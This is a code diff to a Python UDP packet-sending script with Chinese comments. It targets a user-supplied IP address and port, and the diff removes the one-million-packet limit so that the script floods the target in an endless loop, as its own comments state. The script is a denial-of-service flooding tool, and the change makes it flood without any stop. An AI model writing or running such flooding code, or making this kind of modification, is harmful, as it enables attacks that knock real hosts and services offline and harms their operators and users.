@@ -42,11 +42,12 @@ if sd < 1 or sd > 1000000:
 os.system("clear")
 
 sent = 0
-max_packets = 1000000  # Set the maximum number of packets to 1,000,000
-while sent < max_packets:  # Stop after 1,000,000 packets
+# 移除最大数据包限制 (原来是 max_packets = 1000000)
+while True:  # 改为无限循环
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
     time.sleep((1000000 - sd) / 2000000)  # Adjusted delay formula for new range
 
-print(f"已完成发送 {max_packets} 个数据包到 {ip} 端口 {port}")
+# 移除完成提示，因为永远不会结束
+# 原代码: print(f"已完成发送 {max_packets} 个数据包到 {ip} 端口 {port}")
